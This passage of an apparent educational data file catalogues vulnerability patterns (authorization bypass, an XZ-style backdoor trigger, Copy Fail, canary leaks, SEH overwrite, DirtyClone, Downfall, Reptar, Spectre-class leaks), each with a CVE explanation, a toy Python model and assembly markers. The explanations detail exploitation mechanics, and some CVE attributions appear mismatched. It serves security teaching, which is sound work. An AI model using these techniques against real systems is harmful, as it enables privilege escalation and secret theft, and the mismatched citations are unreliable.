      description: 'movl loads the spray payload (0xDEADBEEF) from the prior frame into the fn_ptr stack slot during VulnIoctl construction; cmpl checks cmd against 42 but the conditional branch skips the safe movl that would overwrite fn_ptr with a legitimate address — addl then uses the stale attacker-sprayed value as a function pointer offset, giving the attacker code execution via deterministic stack spraying',
    },
  },
  {
    id: 'auth-bypass',
    name: 'AUTHORIZATION BYPASS',
    severity: 'CRITICAL',
    category: 'Access Control',
    description: 'Missing role check after authentication lets any logged-in user reach admin endpoints, creating unauthorized accounts or exfiltrating sensitive data.',
    explanation:
      'Authorization bypass (CWE-862 / CWE-863) occurs when an application verifies that a user is authenticated ' +
      '(valid session token) but fails to verify that the authenticated user is authorized (correct role or permission) ' +
      'for the requested action. The attacker authenticates as a low-privileged user, then directly accesses admin-only ' +
      'endpoints — creating administrator accounts, modifying configurations, or exfiltrating sensitive data. ' +
      'CWE-862 (Missing Authorization) ranks in the 2025 CWE Top 25 Most Dangerous Software Weaknesses and ' +
      'Broken Access Control holds the #1 position in the OWASP Top 10. ' +
      'CVE-2023-22515 (Atlassian Confluence, CVSS 10.0) allowed unauthenticated remote attackers to create unauthorized ' +
      'administrator accounts by accessing the server setup endpoint directly — exploited as a zero-day by nation-state ' +
      'actors before the patch and added to CISA\'s Known Exploited Vulnerabilities catalog. CVE-2024-0204 (Fortra ' +
      'GoAnywhere MFT, CVSS 9.8) let any user create an admin account via the administration portal by navigating to ' +
      'the initial setup wizard path, bypassing all role checks entirely. CVE-2024-57726 (SimpleHelp, CISA KEV 2026) ' +
      'allowed low-privileged technicians to create API keys with server-admin permissions, escalating from a ' +
      'constrained support role to full platform control. ' +
      'In the assembly, cmpl checks only token validity (session.valid == 1) but no subsequent cmpl verifies ' +
      'role_level >= required_role — the branch jumps directly to the movl that returns sensitive data, skipping ' +
      'the authorization gate entirely. The absence of a second comparison instruction is the vulnerability itself.',
    code:
`# CVE pattern: authn without authz — low-priv user reaches admin endpoint
class Session:
    def __init__(self, user_id, role_level):
        self.user_id = user_id
        self.role_level = role_level
        self.token = user_id * 1337
        self.valid = 1

class AdminPanel:
    def __init__(self, required_role):
        self.required_role = required_role
        self.secret_config = 3405691582
        self.user_records = 3735928559
        self.accessed_by = 0

    def check_auth(self, session):
        if session.valid == 1:
            self.accessed_by = session.user_id
        return self.accessed_by

    def get_records(self, record_id):
        if record_id == 0:
            result = self.secret_config
        elif record_id == 1:
            result = self.user_records
        else:
            result = 0
        return result

panel = AdminPanel(100)
attacker = Session(42, 1)
panel.check_auth(attacker)
stolen = panel.get_records(0)
total = stolen + attacker.role_level
print(total)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl checks session.valid == 1 (authentication) but no subsequent cmpl verifies role_level >= required_role (authorization) — the branch jumps directly past the missing authz gate; movl returns secret_config (0xCAFEBABE) to the attacker\'s low-privilege session, granting full admin data access without role verification',
    },
  },
  {
    id: 'supply-chain-backdoor',
    name: 'SUPPLY CHAIN BACKDOOR',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'A trojanized library function contains a hidden trigger that redirects control flow to execute attacker-controlled payloads when a magic value is detected in input.',
    explanation:
      'Supply chain backdoors (CWE-506 Embedded Malicious Code) are inserted into trusted libraries by compromised maintainers ' +
      'or build systems, lying dormant until a specific trigger activates the payload. The canonical example is CVE-2024-3094 ' +
      '(XZ Utils, CVSS 10.0): a multi-year social engineering campaign planted IFUNC resolvers in liblzma that hooked ' +
      'OpenSSH\'s RSA_public_decrypt at library load time. When sshd called the hooked function, the backdoor checked the RSA ' +
      'modulus for an Ed448 signature matching the attacker\'s private key — if valid, it executed the decrypted payload via ' +
      'system() before authentication completed, granting full remote code execution to anyone holding the key. Build-system ' +
      'guards ensured the payload only activated on x86-64 glibc systems using dpkg or rpm, evading detection on other platforms. ' +
      'Similarly, CVE-2021-44228 (Log4Shell, CVSS 10.0) turned a ubiquitous logging library into an RCE vector via JNDI lookup ' +
      'strings embedded in user input. The supply chain attack surface extends to package registries (event-stream/CVE-2018-16492, ' +
      'ua-parser-js/CVE-2022-25927) and build pipelines (SolarWinds/CVE-2020-14005). ' +
      'In the assembly, a cmpl against a magic constant (the trigger value) gates a conditional jump: if the comparison matches, ' +
      'execution branches to movl instructions that load the hidden payload address into a register and call it — otherwise the ' +
      'benign path continues normally, making the backdoor invisible during ordinary operation.',
    code:
`# CVE pattern: library IFUNC hook with magic-value trigger (XZ/CVE-2024-3094 style)
class CryptoLib:
    def __init__(self, version):
        self.version = version
        self.hook_installed = 0
        self.calls_processed = 0
        self.payload_addr = 3735929054
        self.magic_trigger = 3405691582

    def install_hook(self, target_func):
        if self.version == 56001:
            self.hook_installed = 1
        return self.hook_installed

    def decrypt(self, modulus, key_id):
        self.calls_processed += 1
        result = 0
        if self.hook_installed == 1:
            if modulus == self.magic_trigger:
                result = self.payload_addr
            else:
                result = modulus * 2
        else:
            result = modulus * 2
        return result

class Server:
    def __init__(self, lib):
        self.lib = lib
        self.auth_count = 0

    def handle_connection(self, client_key):
        decrypted = self.lib.decrypt(client_key, 0)
        if decrypted == self.lib.payload_addr:
            self.auth_count += 99
        else:
            self.auth_count += 1
        return self.auth_count

lib = CryptoLib(56001)
lib.install_hook(0)
srv = Server(lib)
normal = srv.handle_connection(12345)
backdoor = srv.handle_connection(3405691582)
total = normal + backdoor
print(total)
`,
    badAsm: {
      patterns: ['cmpl', 'je', 'movl'],
      description: 'cmpl compares the modulus argument against the magic trigger constant (0xCAFEBABE); je branches to the backdoor path only when the attacker\'s crafted input matches — movl then loads the payload address (0xDEAD_C0DE) into the return register, redirecting execution to attacker-controlled code while all other inputs follow the benign decryption path undetected',
    },
  },
  {
    id: 'copy-fail',
    name: 'COPY FAIL',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'A logic flaw in the kernel crypto subsystem lets an unprivileged user write 4 controlled bytes into any readable file\'s page cache, corrupting setuid binaries to gain root.',
    explanation:
      'Copy Fail (CVE-2026-31431, CVSS 7.8) is a deterministic logic flaw in the Linux kernel\'s algif_aead ' +
      'module — the AF_ALG interface exposing AEAD cryptographic operations to userspace. A 2017 optimization ' +
      'made decrypt operations in-place: the code copies AAD and ciphertext into the RX scatterlist but chains ' +
      'authentication-tag pages by reference via sg_chain(), then sets req->src = req->dst. When an attacker ' +
      'splices page-cache-backed pages from a readable file (e.g. /usr/bin/su) into the TX socket, those file ' +
      'pages end up in the writable destination scatterlist. The authencesn(hmac(sha256),cbc(aes)) template ' +
      'writes four bytes of Extended Sequence Number scratch data at offset assoclen + cryptlen — which now ' +
      'lands inside the spliced file\'s cached page, bypassing all permission checks. No race window, no KASLR ' +
      'bypass, no kernel address leak needed: a 732-byte script triggers a controlled 4-byte overwrite ' +
      'deterministically. The attacker targets a setuid binary\'s authentication logic, patching it in-memory so ' +
      'it grants a root shell. Because only the page cache is modified, on-disk file-integrity monitors detect ' +
      'nothing. The upstream fix (commit a664bf3d603d, April 2026) reverts the in-place optimization entirely. ' +
      'In the assembly, the movl that writes the ESN scratch value at the computed dst offset is the corruption ' +
      'primitive — addl calculates assoclen + cryptlen, and the subsequent store overwrites memory the kernel ' +
      'still maps to the victim file\'s page cache.',
    code:
`# CVE pattern: AF_ALG in-place AEAD overwrites page cache (Copy Fail / CVE-2026-31431)
class AlgifAead:
    def __init__(self, key_size):
        self.key_size = key_size
        self.assoclen = 0
        self.cryptlen = 0
        self.inplace = 0
        self.esn_offset = 0

    def setup(self, assoclen, cryptlen):
        self.assoclen = assoclen
        self.cryptlen = cryptlen
        self.esn_offset = assoclen + cryptlen
        self.inplace = 1
        return self.esn_offset

    def decrypt_inplace(self, src_val):
        result = src_val
        if self.inplace == 1:
            result = src_val + self.esn_offset
        return result

class PageCache:
    def __init__(self, file_inode):
        self.file_inode = file_inode
        self.page_data = 0
        self.is_dirty = 0
        self.refcount = 1

    def splice_to_socket(self, dst_offset):
        self.refcount += 1
        return self.refcount

    def overwrite(self, offset, esn_scratch):
        self.page_data = esn_scratch
        self.is_dirty = 1
        return self.is_dirty

sock = AlgifAead(256)
esn_off = sock.setup(16, 48)
cache = PageCache(100663)
refs = cache.splice_to_socket(esn_off)
decrypted = sock.decrypt_inplace(64)
if sock.inplace == 1:
    corrupted = cache.overwrite(esn_off, 3735929054)
after = cache.page_data
print(after)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'cmpl'],
      description: 'addl computes the ESN scratch offset (assoclen + cryptlen); movl writes the 4-byte scratch value at that offset in the destination scatterlist — because sg_chain() linked the page-cache page by reference, this store lands inside the cached setuid binary; cmpl against the inplace flag gates the vulnerable in-place decryption path',
    },
  },
  {
    id: 'canary-leak',
    name: 'STACK CANARY LEAK',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Out-of-bounds read or format specifier leaks the stack canary, letting the attacker craft overflow payloads that pass __stack_chk_fail verification.',
    explanation:
      'Stack canaries (SSP / __stack_chk_guard / CWE-200 adjacent) are random sentinel values placed between ' +
      'local buffers and saved registers on each stack frame. Before returning, the function epilogue compares ' +
      'the canary against the original value loaded from %fs:0x28 (thread-local storage on x86-64) — if they ' +
      'differ, __stack_chk_fail aborts the process, blocking naive stack smashing. However, a separate ' +
      'information-disclosure primitive — a format string %p leak, an out-of-bounds read, or a partial ' +
      'overwrite that leaves the canary intact — can reveal the sentinel to the attacker. With the canary ' +
      'known, the overflow payload includes the correct value at the exact stack offset, and the epilogue\'s ' +
      'comparison passes silently, allowing the overwritten return address to redirect execution. ' +
      'In fork-and-accept servers (Apache prefork, OpenSSH), child processes inherit the parent\'s canary, ' +
      'enabling byte-by-byte brute force — only 256 × 8 = 2048 attempts to recover the full 64-bit value. ' +
      'CVE-2023-6246 (glibc __vsyslog_internal heap overflow, CVSS 8.4) required canary bypass for its ' +
      'local privilege escalation chain on Debian 12, Ubuntu 23.04/23.10, and Fedora 37–38. CVE-2025-32756 ' +
      '(Fortinet stack overflow, CVSS 9.8) was actively exploited in the wild where canary values were ' +
      'recoverable via adjacent format-string disclosure. A 2018 EURECOM study ("Smashing the Stack ' +
      'Protector for Fun and Profit") demonstrated a generic attack vector bypassing canaries on multi-threaded ' +
      'Linux software by overwriting the TLS-stored master canary from an adjacent thread\'s stack overflow. ' +
      'GCC\'s -fstack-protector-strong only instruments functions containing character arrays or address-taken ' +
      'locals, leaving many functions entirely unprotected. ' +
      'In the assembly, `movl` loads the canary from the guard slot during leak_past_buf; the overflow\'s ' +
      '`movl` writes the leaked value back at the same stack offset; `cmpl` in check_canary compares them — ' +
      'the match lets `ret` execute with the attacker\'s overwritten return address, redirecting control ' +
      'flow to libc system() despite stack protection being enabled.',
    code:
`# CVE pattern: OOB read leaks canary — crafted overflow passes __stack_chk
class ProtectedFrame:
    def __init__(self, buf_val, guard):
        self.buf = buf_val
        self.canary = guard
        self.saved_rbp = 4196352
        self.ret_addr = 4196608
        self.check_ok = 0

    def leak_past_buf(self, index):
        if index == 0:
            result = self.buf
        elif index == 1:
            result = self.canary
        elif index == 2:
            result = self.saved_rbp
        else:
            result = self.ret_addr
        return result

    def overflow(self, data, canary_val, ret):
        self.buf = data
        self.canary = canary_val
        self.saved_rbp = 1094795585
        self.ret_addr = ret
        return self.ret_addr

    def check_canary(self, original):
        if self.canary == original:
            self.check_ok = 1
        return self.check_ok

frame = ProtectedFrame(256, 305419896)
stolen = frame.leak_past_buf(1)
frame.overflow(3735928559, stolen, 4151632)
passed = frame.check_canary(305419896)
hijacked = frame.ret_addr + passed
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl in leak_past_buf reads the canary value (0x12345678) from the guard stack slot; the overflow\'s movl writes the leaked value back at the same offset; cmpl in check_canary compares them and the match lets execution continue — the attacker\'s ret_addr (libc system) is loaded by the final movl, hijacking control flow despite -fstack-protector-strong',
    },
  },
  {
    id: 'seh-overwrite',
    name: 'EXCEPTION HANDLER HIJACK',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Buffer overflow overwrites stack-resident exception handler records, redirecting exception dispatch to attacker code while bypassing stack canaries entirely.',
    explanation:
      'Structured Exception Handler overwrite (CWE-121 / CWE-460) exploits the stack-resident exception handler ' +
      'chain that Windows (SEH) and C++ runtimes maintain for stack unwinding. Each stack frame registers an exception ' +
      'record — a {next, handler} pair — linked into a singly-linked list anchored at the Thread Information Block ' +
      '(FS:[0] on x86, GS:[0] on x86-64). When an exception fires (access violation, divide-by-zero, or any hardware ' +
      'fault), the dispatcher walks the chain and calls each handler until one handles the exception. A buffer overflow ' +
      'that reaches the SEH records overwrites the handler pointer with a shellcode or gadget address; the attacker then ' +
      'triggers an exception — often the overflow itself touching an unmapped page — and the dispatcher jumps to ' +
      'attacker-controlled code. The critical insight: stack canaries (__stack_chk_guard) are verified only in the ' +
      'function epilogue (before ret), but SEH dispatch occurs during execution when the exception fires — before ' +
      'the canary check ever runs — so the entire stack protection mechanism is bypassed. ' +
      'CVE-2017-11882 (Microsoft Equation Editor, CVSS 7.8) is the defining example: a 40-byte stack buffer overflow ' +
      'in EQNEDT32.EXE allowed overwriting the SEH chain and return address — with no ASLR, DEP, or SafeSEH compiled ' +
      'into the binary, exploitation was trivial via malicious Office documents. Lazarus Group, APT28, and dozens of ' +
      'cybercrime operations weaponized this CVE for years after disclosure, making it one of the most exploited Office ' +
      'vulnerabilities in history. CVE-2009-1535 (IIS 6.0 WebDAV) was the classic network-facing SEH overwrite enabling ' +
      'remote code execution on web servers. On Linux, GCC-generated .eh_frame DWARF unwind tables contain personality ' +
      'routine function pointers serving the same role; corruption of these tables redirects C++ exception unwinding to ' +
      'attacker-chosen addresses. Microsoft introduced SafeSEH (validating handlers against a compile-time whitelist) ' +
      'and SEHOP (verifying chain integrity via a sentinel record at the tail), but binaries compiled without /SAFESEH ' +
      'or legacy 32-bit software remain fully vulnerable. ' +
      'In the assembly, movl stores the legitimate handler address into the SEH record stack slot during construction; ' +
      'the overflow loop\'s addl spills past buf_cap — movl then overwrites the handler slot with 0xDEADBEEF; ' +
      'dispatch_exception\'s addl combines the hijacked handler with the chain pointer for execution; cmpl in ' +
      'canary_check verifies the canary AFTER the exception has already dispatched, demonstrating why SEH overwrite ' +
      'bypasses stack protection entirely.',
    code:
`# CVE pattern: overflow corrupts SEH record — exception dispatch bypasses canary
class SEHRecord:
    def __init__(self, handler, next_ptr):
        self.handler = handler
        self.next_ptr = next_ptr
        self.dispatched = 0

    def dispatch_exception(self):
        result = self.handler + self.next_ptr
        self.dispatched = 1
        return result

class StackFrame:
    def __init__(self, buf_cap, canary):
        self.buf_cap = buf_cap
        self.buf_data = 0
        self.canary = canary
        self.spill = 0

    def overflow(self, value, count):
        i = 0
        while i < count:
            self.buf_data += value
            if i >= self.buf_cap:
                self.spill += 1
            i += 1
        return self.spill

    def canary_check(self, original):
        if self.canary == original:
            return 1
        return 0

seh = SEHRecord(4196352, 4196608)
frame = StackFrame(8, 305419896)
frame.overflow(16, 12)
seh.handler = 3735928559
hijacked = seh.dispatch_exception()
passed = frame.canary_check(305419896)
result = hijacked + passed
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'cmpl'],
      description: 'movl stores the legitimate handler address (0x400800) into the SEH record stack slot during construction; the overflow loop\'s addl spills past buf_cap — movl overwrites the handler slot with 0xDEADBEEF; dispatch_exception\'s addl combines the hijacked handler with the chain pointer; cmpl in canary_check verifies the canary AFTER the exception has already dispatched, demonstrating why SEH overwrite bypasses stack protection entirely',
    },
  },
  {
    id: 'dirty-clone',
    name: 'DIRTYCLONE SKB FLAG LOSS',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Packet cloning drops the SKBFL_SHARED_FRAG safety flag, letting IPsec decrypt in-place into the page cache and silently overwrite setuid binaries for root.',
    explanation:
      'DirtyClone (CVE-2026-43503 / CWE-416, CVSS 8.8) exploits a flag-propagation flaw in the Linux kernel\'s ' +
      'skbuff networking stack. The kernel tags any sk_buff holding page-cache-backed fragment references with the ' +
      'SKBFL_SHARED_FRAG flag — skb_has_shared_frag() reads this tag to decide whether a payload can be mutated ' +
      'in place. The bug: __pskb_copy_fclone() silently drops the flag when cloning a packet. A netfilter TEE rule ' +
      '(which duplicates packets internally via __pskb_copy_fclone) creates a cloned skb that references a ' +
      'page-cache page from /usr/bin/su but reports nothing is shared. The cloned skb reaches esp_input() where ' +
      'IPsec decrypts the payload directly into the buffer — which still maps the page cache page. By manipulating ' +
      'the AES-CBC key, IV, and packet layout, the attacker computes ciphertext that decrypts into specific bytes, ' +
      'patching the authentication logic of su in memory. The next execution of su uses the modified cached page ' +
      'and grants root without a password. Because page cache is shared at the host level but capabilities are ' +
      'namespaced, an unprivileged user with user-namespace access (default on Debian and Fedora) can trigger the ' +
      'clone path. Discovered by JFrog Security Research and disclosed June 2026, the fix was merged as commit ' +
      '48f6a5356a33 in Linux v7.1-rc5 (May 24, 2026). File integrity tools that hash on-disk files report no change ' +
      'because DirtyClone corrupts only the in-memory page cache, never touching disk. ' +
      'In the assembly, movl sets the shared_frag flag to 1 on the original skb; clone_packet\'s movl copies the ' +
      'payload but does NOT copy the flag — cmpl in decrypt_inplace checks shared_frag == 0 on the clone and the ' +
      'branch allows movl to overwrite page_data with the decrypted payload (0xDEADBEEF), silently corrupting the ' +
      'page cache of the setuid binary.',
    code:
`# CVE pattern: skb clone drops SHARED_FRAG — IPsec writes page cache
class SkBuff:
    def __init__(self, data, frag_page):
        self.data = data
        self.frag_page = frag_page
        self.shared_frag = 1
        self.cloned = 0

    def clone_packet(self):
        clone = SkBuff(self.data, self.frag_page)
        clone.shared_frag = 0
        clone.cloned = 1
        return clone

class PageCache:
    def __init__(self, inode, data):
        self.inode = inode
        self.data = data
        self.dirty = 0

    def read(self):
        result = self.data + self.inode
        return result

class EspDecryptor:
    def __init__(self, key):
        self.key = key
        self.decrypted = 0

    def decrypt_inplace(self, skb, cache, payload):
        if skb.shared_frag == 0:
            cache.data = payload
            self.decrypted = 1
        return self.decrypted

su_page = PageCache(4196352, 1094795585)
original = SkBuff(256, su_page.data)
clone = original.clone_packet()
esp = EspDecryptor(305419896)
esp.decrypt_inplace(clone, su_page, 3735928559)
hijacked = su_page.read()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl sets shared_frag=1 on the original skb, but clone_packet\'s movl copies the payload without the flag — cmpl in decrypt_inplace checks shared_frag == 0 on the clone and the branch allows movl to overwrite page_data with the decrypted payload (0xDEADBEEF), silently corrupting the page cache of /usr/bin/su without touching disk',
    },
  },
  {
    id: 'downfall-gds',
    name: 'DOWNFALL GATHER LEAK',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Intel gather instruction transiently forwards stale vector register data from co-resident threads, leaking AES keys and secrets via cache side-channel.',
    explanation:
      'Downfall / Gather Data Sampling (CVE-2022-40982 / CWE-203, CVSS 6.5 but critical practical impact) ' +
      'exploits Intel\'s AVX2/AVX-512 gather instruction (VPGATHERDD/VPGATHERQQ), which fetches non-contiguous ' +
      'data elements from memory using vector-index addressing. Internally, the CPU services gather loads from a ' +
      'shared physical vector register file — and during transient execution, stale values left by prior operations ' +
      'on the same physical core (including from different threads, processes, or VMs) are forwarded to dependent ' +
      'instructions before the CPU verifies that the gather has correct data. The attacker uses a Flush+Reload ' +
      'timing attack on a probe array indexed by the transiently leaked bytes to recover the secret. ' +
      'Discovered by Daniel Moghimi at Google and disclosed at USENIX Security 2023, Downfall demonstrated ' +
      'end-to-end theft of AES-128 and AES-256 keys from OpenSSL in under 10 seconds — an attacker process ' +
      'running on a sibling hyperthread recovers the full key by observing gather-induced transient forwarding ' +
      'from the victim\'s AES-NI round key schedule stored in YMM/ZMM registers. The physical register file is ' +
      'competitively shared between sibling threads, so a gather in the attacker context transiently reads ' +
      'values deposited by the victim\'s AESENC/AESDEC instructions. Affected processors span Intel 6th-gen ' +
      'Skylake through 11th-gen Tiger Lake (billions of devices). Unlike Spectre (branch prediction) or ' +
      'MDS (fill buffers), Downfall targets the vector register file itself — a previously untapped ' +
      'microarchitectural attack surface. Intel\'s microcode fix blocks transient forwarding from gather, ' +
      'but incurs up to 50% overhead on AVX-heavy workloads. ' +
      'In the assembly, movl loads the victim\'s AES round key (0xCAFEBABE) and plaintext into stack slots ' +
      'representing vector registers; the attacker\'s gather_sample reads from the same physical register file ' +
      'offset via addl — no isolation check (no lfence or register-clear) appears between the victim\'s store ' +
      'and the attacker\'s transient read; imull multiplies the leaked value by 256 to compute the probe array ' +
      'cache line index for Flush+Reload recovery.',
    code:
`# CVE pattern: gather leaks stale vector regs — AES key theft via cache
class VectorRegFile:
    def __init__(self, capacity):
        self.capacity = capacity
        self.ymm0 = 0
        self.ymm1 = 0
        self.ymm2 = 0
        self.stale = 0

    def victim_aesenc(self, round_key, plaintext):
        self.ymm0 = round_key
        self.ymm1 = plaintext
        self.ymm2 = round_key + plaintext
        return self.ymm2

class GatherAttacker:
    def __init__(self, probe_size):
        self.probe_size = probe_size
        self.leaked = 0
        self.probe_index = 0
        self.recovered = 0

    def gather_sample(self, regfile):
        self.leaked = regfile.ymm0
        self.probe_index = self.leaked * 256
        return self.probe_index

    def flush_reload(self, expected):
        if self.probe_index == expected * 256:
            self.recovered = self.leaked
        return self.recovered

regfile = VectorRegFile(16)
aes_key = 3405691582
plaintext = 305419896
regfile.victim_aesenc(aes_key, plaintext)
attacker = GatherAttacker(4096)
probe = attacker.gather_sample(regfile)
stolen = attacker.flush_reload(aes_key)
print(stolen)
`,
    badAsm: {
      patterns: ['movl', 'imull', 'addl'],
      description: 'movl loads the victim\'s AES round key (0xCAFEBABE) into the vector register file stack slot; the attacker\'s gather_sample reads from the same offset via addl with no register isolation or lfence barrier — imull multiplies the transiently leaked value by 256 to compute the cache probe line index for Flush+Reload timing recovery of the full AES key',
    },
  },
  {
    id: 'reptar-prefix',
    name: 'REPTAR PREFIX CONFUSION',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Redundant REX prefix on REP MOVSB corrupts the CPU instruction decoder, enabling privilege escalation from user-space to kernel.',
    explanation:
      'Reptar (CVE-2023-23583 / CWE-269, CVSS 8.8) is a hardware vulnerability in Intel processors ' +
      'that support Fast Short Repeat Move (FSRM). When a REP MOVSB instruction is encoded with a ' +
      'redundant REX prefix (e.g., rex.rxb rep movsb), the CPU decoder enters an undefined ' +
      'microarchitectural state — normally redundant prefixes are silently ignored, but the FSRM ' +
      'fast-path misinterprets the extra REX byte, corrupting the internal micro-op stream. The ' +
      'corrupted decoder causes branches to jump to unexpected locations, breaking instruction ' +
      'boundary alignment and creating a condition where the CPU executes attacker-controlled bytes ' +
      'as privileged code. An unprivileged process at CPL3 (user-space ring 3) can trigger this to ' +
      'escalate to CPL0 (kernel ring 0), gaining full control of the machine. In multi-tenant ' +
      'cloud environments, exploitation from a guest VM can crash the host hypervisor, causing ' +
      'denial of service to all co-resident tenants. Discovered by Google security researchers ' +
      'Tavis Ormandy and others, Reptar was disclosed in November 2023 and affects Intel 10th-gen ' +
      'Ice Lake through 13th-gen Raptor Lake desktop and Xeon Sapphire Rapids server processors — ' +
      'hundreds of millions of devices. Unlike Spectre (branch prediction) or Meltdown (out-of-order ' +
      'loads), Reptar targets the instruction decoder itself, a previously unexploited attack surface. ' +
      'Intel released an emergency out-of-band microcode update to fix the prefix handling logic. ' +
      'In the assembly, movl stores the redundant prefix flag and the FSRM-active flag into stack ' +
      'slots representing decoder state; the cmpl check for conflicting prefixes is bypassed when ' +
      'both flags are set simultaneously — the subsequent movl to cpl writes 0 (ring 0) without ' +
      'any privilege gate, modeling how the corrupted decoder skips the CPL enforcement check.',
    code:
`# CVE pattern: redundant REX prefix on REP MOVSB corrupts decoder — CPL3 to CPL0
class InsnDecoder:
    def __init__(self, fsrm_on):
        self.fsrm = fsrm_on
        self.prefix_count = 0
        self.rex_seen = 0
        self.rep_seen = 0
        self.cpl = 3
        self.corrupted = 0

    def add_prefix(self, is_rex):
        self.prefix_count += 1
        if is_rex:
            self.rex_seen = 1
        else:
            self.rep_seen = 1
        return self.prefix_count

    def decode_movsb(self):
        if self.rep_seen and self.rex_seen and self.fsrm:
            self.corrupted = 1
            self.cpl = 0
        return self.corrupted

class VmGuest:
    def __init__(self, guest_id):
        self.guest_id = guest_id
        self.alive = 1
        self.escaped = 0

    def exploit_decoder(self, decoder):
        if decoder.corrupted:
            self.escaped = 1
            self.alive = 0
        return self.escaped

decoder = InsnDecoder(1)
decoder.add_prefix(0)
decoder.add_prefix(1)
result = decoder.decode_movsb()
vm = VmGuest(42)
escape = vm.exploit_decoder(decoder)
print(escape)
`,
    badAsm: {
      patterns: ['movl', 'cmpl', 'je'],
      description: 'movl stores the redundant REX flag and FSRM-active flag into decoder state stack slots; cmpl checks for conflicting prefixes but the je branch is not taken when both flags are set — the subsequent movl writes 0 into the cpl slot (ring 0 privilege) with no gate check, modeling how the corrupted FSRM decoder skips CPL enforcement entirely',
    },
  },
  {
    id: 'spec-store-bypass',
    name: 'SPECULATIVE STORE BYPASS',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'CPU speculatively loads stale data from memory before a prior store to the same address retires, leaking overwritten secrets via cache timing side-channel.',
    explanation:
      'Speculative Store Bypass (SSB / Spectre Variant 4 / CVE-2018-3639 / CWE-200) exploits CPU store-to-load ' +
      'forwarding prediction: when a store instruction writes to an address and a subsequent load reads from the ' +
      'same address, the CPU must detect the dependency and forward the stored value. However, resolving store ' +
      'addresses takes time, so the CPU predicts whether the load depends on the pending store. When it mispredicts ' +
      '"no dependency," the load speculatively reads the stale (pre-store) value from the cache — which may be a ' +
      'secret that the store was meant to sanitize. The speculative load then uses the stale secret to index a ' +
      'probe array, creating a measurable cache-timing side-channel that persists after rollback. ' +
      'Unlike Spectre v1 (bounds check bypass via conditional branch misprediction) and Spectre v2 (indirect branch ' +
      'target poisoning), SSB exploits the memory disambiguation predictor — a fundamentally different CPU component. ' +
      'The attack is devastating against sandboxed environments: a JavaScript JIT engine stores a bounds-clamped ' +
      'value and immediately loads it back, but the CPU speculatively reads the unclamped original, bypassing the ' +
      'sandbox\'s memory isolation. Discovered by Ken Johnson (Microsoft) and Jann Horn (Google Project Zero) in ' +
      'May 2018, SSB affects every Intel CPU since Sandy Bridge, every AMD CPU since Bulldozer, and all ARM ' +
      'Cortex-A cores. CVE-2019-1125 (SWAPGS) extended the attack surface by combining SSB with a SWAPGS ' +
      'instruction timing window, leaking Windows kernel memory from user-space. CVE-2020-0543 (CROSSTALK/SRBDS) ' +
      'demonstrated that speculative store bypass could leak data across CPU cores via the shared staging buffer. ' +
      'Mitigation requires the SSBD (Speculative Store Bypass Disable) bit in IA32_SPEC_CTRL MSR or inserting ' +
      'LFENCE between every store-load pair to the same address — both carry measurable performance overhead. ' +
      'In the assembly, the first movl stores the safe value (0) into the data slot, but the second movl loads ' +
      'from the same stack offset before the store retires — the CPU\'s memory disambiguator mispredicts "no ' +
      'dependency" and the load reads the stale secret (0xCAFEBABE). imull multiplies the leaked value by 256 to ' +
      'compute the cache probe line index, and no lfence serializing instruction appears between the store and ' +
      'the dependent load.',
    code:
`# CVE pattern: CPU bypasses prior store — load reads stale secret
class SandboxMem:
    def __init__(self, secret, bound):
        self.data = secret
        self.bound = bound
        self.safe_val = 0
        self.probe_idx = 0

    def clamp_and_read(self, overwrite):
        self.data = overwrite
        leaked = self.data
        self.probe_idx = leaked * 256
        return self.probe_idx

    def residue(self):
        result = self.probe_idx + self.bound
        return result

class Attacker:
    def __init__(self, stride):
        self.stride = stride
        self.recovered = 0

    def flush_reload(self, probe_val):
        self.recovered = probe_val + self.stride
        return self.recovered

sandbox = SandboxMem(3405691582, 4096)
attacker = Attacker(256)
i = 0
while i < 5:
    sandbox.clamp_and_read(0)
    i += 1
leaked = sandbox.clamp_and_read(0)
recovered = attacker.flush_reload(leaked)
print(recovered)
`,
    badAsm: {
      patterns: ['movl', 'imull'],
      description: 'the first movl stores the sanitized value (0) into the data slot on the stack, but the second movl loads from the same offset before the store retires — the CPU\'s memory disambiguator mispredicts "no dependency" and speculatively reads the stale secret (0xCAFEBABE); imull multiplies the leaked value by 256 to compute the cache probe line index, and no lfence serializing instruction appears between the store and the dependent load, leaving the speculative window open for Flush+Reload secret recovery',
    },
  },
  {
    id: 'inception-rsb',
    name: 'INCEPTION RSB POISONING',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'CPU misclassifies XOR as a call instruction via phantom speculation, poisoning the Return Stack Buffer with an attacker-controlled address to leak kernel secrets.',
    explanation:
      'Inception (CVE-2023-20569 / CWE-200) is a transient execution attack that poisons the CPU\'s Return Stack ' +
      'Buffer (RSB) — the microarchitectural stack that predicts return addresses. When a function executes `ret`, ' +
      'the CPU predicts the target by popping the RSB rather than waiting for the actual stack read to complete. ' +
      'Inception exploits Phantom speculation (CVE-2022-23825) to make the CPU misclassify a harmless XOR instruction ' +
      'as a recursive call, pushing an attacker-controlled address onto the RSB. When a subsequent `ret` pops this ' +
      'poisoned entry, the CPU speculatively executes at the attacker\'s chosen gadget address — typically a kernel ' +
      'function that loads a secret into a register and uses it to index memory. The secret is encoded into the cache ' +
      'state via a Flush+Reload probe array, surviving architectural rollback. The technique chains Training in ' +
      'Transient Execution (TTE): the attacker trains the branch predictor inside a speculative window created by ' +
      'Phantom, so even hardware mitigations like IBPB (Indirect Branch Prediction Barrier) and eIBRS are bypassed. ' +
      'Demonstrated by ETH Zürich researchers at USENIX Security 2023, Inception leaks kernel memory at 39 bytes/sec ' +
      'on all AMD Zen 1 through Zen 4 CPUs — enough to steal a 16-character password in 0.4 seconds or an RSA key ' +
